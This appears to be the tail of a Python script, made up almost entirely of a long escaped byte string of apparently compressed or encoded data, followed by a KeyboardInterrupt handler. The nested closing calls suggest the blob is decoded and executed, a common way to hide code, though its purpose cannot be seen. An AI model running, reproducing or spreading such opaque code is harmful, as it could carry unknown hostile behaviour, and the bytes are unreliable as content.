}e\x92a\xf6\xfbx\xea\xc9\x97\xad)oV\x12\x03j\xd4\'\xd1\xc6\xa8\x10\x9b\xc2\xdam5\xa5\x17\xda\x07t7\xb6a&\xf63k\xa4Y]\x1b8g=\x8b\x8dt\x15\x80\xf5\xf5\xf4\xc0w\xf0\x0e\xc0\x1bw?p]\xc9\xea:[\x8d\xa9\xb1\xf1\xb8G\xda\xa1g&&`\xb5\'\xb6\x0f\x8a\x07J\xf4%\xd5DP\x7f\xb0\'!\xa6O\xcd\x1d\x1f\xcfj\xad\xc2\xba\xe9,t\x04\x85fa\xd1\x0e\xbeO\xea\x88\xd9s|\x02x\xc7N\xf4m7\xedW\xd8\xa6\xb9\xd0\xbeq\xc8E\x8e\x84\x02\x94\x83)\x86\xaah\r6\x994Z\x04b\xa2\x06\x06\xadS\x132\xd5\x97V\xa9\x9f^\r2\xa3AOn\x8dq\xac\xb9\x8f\x96\xb6\xb0\xea,<\xebP-\xa2\xec\x05\xa0p\x80Iz\xc9\xad\x88\xd9z\xd5e&- \xc9|l\xb4\x1b$\x89c\x96\xb5u\xa1n\xbb]\xe5\x08\xb7h\x9e\x8d\xf6l\x1e#n(Y\xc2M\xa1|\x16\xb9\xb794yg\x17ja\x99\x89\xa2\x17\xdf\xadk\xab\x95\xc1\xb9\xd7~\x84\'\xe59\xfe*\x93\x18\x08l?\xa0F1X\xcf\x9b@M\x15\x8dM\x14\t\x0c\x07\xc0|~r\xf5\xf6\xba\xdck\xdc\xc1\x8ad\xec\xb8V\t\x86\x03\xa6\x9d\x8b\xd3\xaf\x8b\xfb\xf7\xf3a\x0cR\xcf0$\x12\xa6\xe5\x17ZB\xf5L\x95\x0e\xd8zK\xae4\xef\x08t\xaf\xa7mY3\xc9~\x91\x06\x9d\xa1B\xa1\xf4\xbeb\xc8?6\x18\xbd\xc9\xf0\xd1DC\xa9cV\xec\x1a>\xbb\x0f<9l]\x01\x07\xfc\xef\x9e\x00\x84Q\xcahn2\xc0\x8eT\xae0\xbco;\xef\x94KX\xafn\xed\xd8]\xc5\xd8\xb7\x97w]\xdd\xca\xb1\xe2\xf2|\x7fI+\x96\xb4\xca^\xd36+\xd6c\xca\x8e\xb8\x98j\x05\x17Le\x9e\x83)\xad\xe9q\x128\x99{\xcc\xa9\x0e\xe5\xc7\x97\x93Pu+I#H\x82\xeb%U\x16\t3e\xf5\xc3\x9f\xda\x0c#\x98\xa7\xe3\xb8\xfchky\x8c\xa6\xd0s\xd2\x18S\x1d@(d\xbe\xd9\xc6\x10GmeS\x9f\x15E\xb5\x98\xfc_L\xb4\x93\xcfh\x0e\x90x,\xd8\x8be\xdf\x0cU\x8ex\xbd \x7fR\xe0j\x0e\x085\xa1\xa5i\xd9\x97lB\x8eu&\x95\xbbK7\xba\x0f#\x83\x9e\xf0M\xcb\xc6V\xdd\x82-\x97}\x9c;\xcbS-\xc6\x93\x03\xa87\x98\x03\x96l*\xe5\xb5\xc6\xcb\x84\x1e\x12\x96\x04&c\xb9\xc6\xa1\xd4\xc3x\xf4\xa8\xf9*O\xc4\x11\xb6p\x166\x9b\xac\xc5\x1al\xd8\xaf\xa6\xaf\x84\x1b\xe4\x18\x07\x0f/R\x17\xdb\xcd\x9f=_\xe3w\xfd\xe1\xe8\xe1\xf7[\xff\x17rE8P\x901[>\xee')))
except KeyboardInterrupt:
	exit()
